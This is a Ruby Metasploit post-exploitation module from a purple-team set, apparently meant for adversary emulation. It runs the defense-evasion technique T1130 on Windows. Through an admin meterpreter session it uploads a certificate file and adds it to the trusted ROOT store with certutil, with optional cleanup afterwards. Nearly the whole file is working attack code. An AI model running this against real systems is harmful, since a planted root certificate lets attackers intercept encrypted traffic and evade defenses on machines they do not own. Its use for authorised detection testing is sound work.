##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Install Root Certificate (T1130) Windows - Purple Team',
        'Description'   => %q{
          Defense Evasion:
          Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1130' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new("CERT_FILE", [true, "Certificate to install.", Msf::Config.data_directory + "/purple/t1130/t1130.der"]),
        OptBool.new('CLEANUP', [true, "Unregister certificate after execution.", true])
      ])
  end


  def run
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'
      fail_with(Failure::NoAccess, "Module requires administration privileges") unless is_admin?

      # upload the cert
      local_file_path = datastore['CERT_FILE']
      remote_file_path = "C:\\t1130.der"
      print_status("Uploading #{local_file_path} to #{remote_file_path}")
      upload_file(remote_file_path, local_file_path)

      # install the certificate
      t1130_certutil(remote_file_path)

      print_good("Module T1130 execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1130 execution failed.")
    end
  end


  def t1130_certutil(cert_path)
    # get the cert issuing org so that we can check for it in the store once installed
    cert_name = run_cmd("certutil #{cert_path} | findstr O=").scan(/O=(.*),/).last.first

    # install the certificate
    cmd = "certutil -v -f -addstore ROOT #{cert_path}"
    print_status("Registering root certificate for '#{cert_name}'")
    output = run_cmd(cmd)
    print_status(output)
    if not output.include? "success"
      print_warning("Certificate installation may have failed.")
    else
      print_good("Certificate installation successful.")
    end

    if datastore['CLEANUP']
      print_status("Cleaning up...")
      register_files_for_cleanup(cert_path)

      # get the cert element ID from the output so that we can reference it for removal
      # if we didn't get the cert_id from the initial add, add it again to get verbose output
      # :(
      begin
        cert_id = output.scan(/Element (.*):/).last.first
      rescue
        cert_id = run_cmd(cmd).scan(/Element (.*):/).last.first
      end

      # remove the certificate
      cmd = "certutil -delstore ROOT #{cert_id}"
      output = run_cmd(cmd)
      print_status(output)
      if not output.include? "success"
        print_warning("Certificate removal may have failed.")
      else
        print_good("Certificate removed.")
      end
    end
  end
end
